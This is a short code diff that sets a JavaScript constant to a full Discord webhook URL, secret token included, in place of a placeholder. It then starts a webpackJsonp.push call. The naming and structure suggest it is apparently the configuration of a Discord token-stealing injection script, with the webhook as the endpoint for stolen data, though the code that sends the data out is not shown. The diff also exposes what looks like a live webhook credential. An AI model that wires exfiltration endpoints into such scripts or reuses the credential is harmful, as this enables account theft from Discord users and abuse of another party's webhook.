@@ -1,4 +1,4 @@
-const webhookLarsy = 'YOUR WEBHOOK URL HERE';
+const webhookLarsy = 'https://discord.com/api/webhooks/1274498078321279036/KBMk9wRJojOFpVoFgYs9wE5Rs95cbyAgeeluMvNrgiFBPILBIc94XN-04XfyuGooIUoH';
 
 var larsyyyy = webpackJsonp.push([
     [], {
